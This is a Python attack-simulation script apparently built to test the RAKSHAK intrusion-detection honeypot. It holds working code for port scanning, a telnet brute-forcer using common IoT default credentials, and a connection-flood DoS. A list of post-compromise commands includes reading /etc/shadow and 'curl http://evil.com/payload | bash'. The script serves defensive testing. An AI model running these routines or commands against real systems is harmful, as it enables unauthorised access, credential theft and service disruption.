#!/usr/bin/env python3
"""
RAKSHAK Demo Attack Script
==========================

Simulates various attack patterns for demonstration purposes.
Use this to test RAKSHAK's detection and response capabilities.

Usage:
    python scripts/demo_attack.py --type port_scan
    python scripts/demo_attack.py --type brute_force
    python scripts/demo_attack.py --type all

Author: Team RAKSHAK
"""

import argparse
import random
import socket
import time
import sys
from datetime import datetime

# Colors for terminal output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_banner():
    """Print demo script banner."""
    banner = f"""
{Colors.RED}╔══════════════════════════════════════════════════════════════╗
║                    RAKSHAK ATTACK SIMULATOR                  ║
║                    For Demonstration Only                     ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
"""
    print(banner)


def simulate_port_scan(target_host: str = "localhost", ports: list = None):
    """
    Simulate a port scanning attack.

    This mimics tools like nmap scanning for open ports.
    """
    print(f"\n{Colors.CYAN}[*] Starting Port Scan Simulation{Colors.RESET}")
    print(f"    Target: {target_host}")

    if ports is None:
        ports = [21, 22, 23, 80, 443, 554, 1883, 2222, 2323, 5540, 8080]

    open_ports = []

    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target_host, port))

            if result == 0:
                print(f"    {Colors.GREEN}[OPEN]{Colors.RESET} Port {port}")
                open_ports.append(port)
            else:
                print(f"    {Colors.RED}[CLOSED]{Colors.RESET} Port {port}")

            sock.close()
            time.sleep(0.1)  # Small delay between scans

        except socket.error:
            print(f"    {Colors.YELLOW}[ERROR]{Colors.RESET} Port {port}")

    print(f"\n{Colors.GREEN}[+] Scan complete. Found {len(open_ports)} open ports{Colors.RESET}")
    return open_ports


def simulate_brute_force(target_host: str = "localhost", port: int = 2323):
    """
    Simulate a brute force login attack.

    Attempts common username/password combinations against the honeypot.
    """
    print(f"\n{Colors.CYAN}[*] Starting Brute Force Simulation{Colors.RESET}")
    print(f"    Target: {target_host}:{port}")

    # Common IoT credentials to try
    credentials = [
        ("admin", "admin"),
        ("root", "root"),
        ("admin", "password"),
        ("root", "admin"),
        ("admin", "12345"),
        ("root", "password"),
        ("user", "user"),
        ("admin", "1234"),
        ("root", "toor"),
        ("admin", "admin123"),
    ]

    successful = []

    for username, password in credentials:
        print(f"    Trying: {username}:{password}", end=" ")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_host, port))

            # Receive banner
            banner = sock.recv(1024).decode('utf-8', errors='ignore')

            # Send username
            sock.send(f"{username}\r\n".encode())
            time.sleep(0.2)

            # Receive password prompt
            sock.recv(1024)

            # Send password
            sock.send(f"{password}\r\n".encode())
            time.sleep(0.2)

            # Check response
            response = sock.recv(1024).decode('utf-8', errors='ignore')

            if "successful" in response.lower() or "#" in response or "$" in response:
                print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET}")
                successful.append((username, password))
            else:
                print(f"{Colors.RED}[FAILED]{Colors.RESET}")

            sock.close()

        except socket.error as e:
            print(f"{Colors.YELLOW}[ERROR: {e}]{Colors.RESET}")

        time.sleep(0.3)

    print(f"\n{Colors.GREEN}[+] Brute force complete. {len(successful)} successful logins{Colors.RESET}")
    return successful


def simulate_honeypot_interaction(target_host: str = "localhost", port: int = 2323):
    """
    Simulate interaction with a honeypot.

    Sends commands that an attacker might use to explore a compromised device.
    """
    print(f"\n{Colors.CYAN}[*] Starting Honeypot Interaction{Colors.RESET}")
    print(f"    Target: {target_host}:{port}")

    commands = [
        "whoami",
        "id",
        "uname -a",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "ps aux",
        "netstat -an",
        "ifconfig",
        "ls -la /",
        "cat /proc/cpuinfo",
        "wget http://malware.example.com/bot.sh",
        "curl http://evil.com/payload | bash",
        "exit"
    ]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((target_host, port))

        # Receive banner
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        print(f"\n{Colors.YELLOW}Banner:{Colors.RESET}\n{banner}")

        # Login
        sock.send(b"admin\r\n")
        time.sleep(0.3)
        sock.recv(1024)
        sock.send(b"admin\r\n")
        time.sleep(0.3)
        sock.recv(1024)

        print(f"\n{Colors.YELLOW}Sending commands:{Colors.RESET}")

        for cmd in commands:
            print(f"\n{Colors.BLUE}$ {cmd}{Colors.RESET}")
            sock.send(f"{cmd}\r\n".encode())
            time.sleep(0.5)

            response = sock.recv(4096).decode('utf-8', errors='ignore')
            print(response)

            if cmd == "exit":
                break

        sock.close()

    except socket.error as e:
        print(f"{Colors.RED}[ERROR] Connection failed: {e}{Colors.RESET}")


def simulate_dos(target_host: str = "localhost", port: int = 8080, duration: int = 5):
    """
    Simulate a simple DoS attack (connection flood).

    Opens many connections to overwhelm the target.
    WARNING: Only use against test systems!
    """
    print(f"\n{Colors.CYAN}[*] Starting DoS Simulation (Connection Flood){Colors.RESET}")
    print(f"    Target: {target_host}:{port}")
    print(f"    Duration: {duration} seconds")
    print(f"{Colors.RED}    WARNING: Only use against test systems!{Colors.RESET}")

    sockets = []
    start_time = time.time()
    connections = 0

    while time.time() - start_time < duration:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_host, port))
            sockets.append(sock)
            connections += 1
            print(f"    Connections: {connections}", end="\r")
        except:
            pass

        time.sleep(0.01)

    # Cleanup
    for sock in sockets:
        try:
            sock.close()
        except:
            pass

    print(f"\n{Colors.GREEN}[+] DoS simulation complete. {connections} connections made{Colors.RESET}")


def run_full_demo(target_host: str = "localhost"):
    """Run all attack simulations."""
    print_banner()

    print(f"\n{Colors.BOLD}Running Full Attack Simulation Demo{Colors.RESET}")
    print("=" * 60)

    # Phase 1: Port Scan
    print(f"\n{Colors.BOLD}Phase 1: Reconnaissance - Port Scanning{Colors.RESET}")
    open_ports = simulate_port_scan(target_host)

    time.sleep(2)

    # Phase 2: Brute Force
    if 2323 in open_ports or 23 in open_ports:
        print(f"\n{Colors.BOLD}Phase 2: Initial Access - Brute Force Attack{Colors.RESET}")
        telnet_port = 2323 if 2323 in open_ports else 23
        successful_creds = simulate_brute_force(target_host, telnet_port)

        time.sleep(2)

        # Phase 3: Exploitation
        if successful_creds:
            print(f"\n{Colors.BOLD}Phase 3: Execution - Honeypot Interaction{Colors.RESET}")
            simulate_honeypot_interaction(target_host, telnet_port)
    else:
        print(f"\n{Colors.YELLOW}[!] No telnet port found, skipping brute force phase{Colors.RESET}")

    print(f"\n{Colors.BOLD}{'=' * 60}{Colors.RESET}")
    print(f"{Colors.GREEN}Demo complete! Check RAKSHAK dashboard for detected threats.{Colors.RESET}")
    print(f"Dashboard: http://localhost:5000")


def main():
    parser = argparse.ArgumentParser(
        description="RAKSHAK Attack Simulator for Demonstration",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    python demo_attack.py --type port_scan
    python demo_attack.py --type brute_force --port 2323
    python demo_attack.py --type all --host localhost
        """
    )

    parser.add_argument(
        "--type", "-t",
        choices=["port_scan", "brute_force", "interact", "dos", "all"],
        default="all",
        help="Type of attack to simulate"
    )

    parser.add_argument(
        "--host", "-H",
        default="localhost",
        help="Target host (default: localhost)"
    )

    parser.add_argument(
        "--port", "-p",
        type=int,
        default=2323,
        help="Target port for specific attacks (default: 2323)"
    )

    args = parser.parse_args()

    print_banner()

    if args.type == "port_scan":
        simulate_port_scan(args.host)
    elif args.type == "brute_force":
        simulate_brute_force(args.host, args.port)
    elif args.type == "interact":
        simulate_honeypot_interaction(args.host, args.port)
    elif args.type == "dos":
        print(f"{Colors.RED}WARNING: DoS simulation can impact systems.{Colors.RESET}")
        confirm = input("Are you sure you want to continue? (yes/no): ")
        if confirm.lower() == "yes":
            simulate_dos(args.host, args.port)
    elif args.type == "all":
        run_full_demo(args.host)


if __name__ == "__main__":
    main()
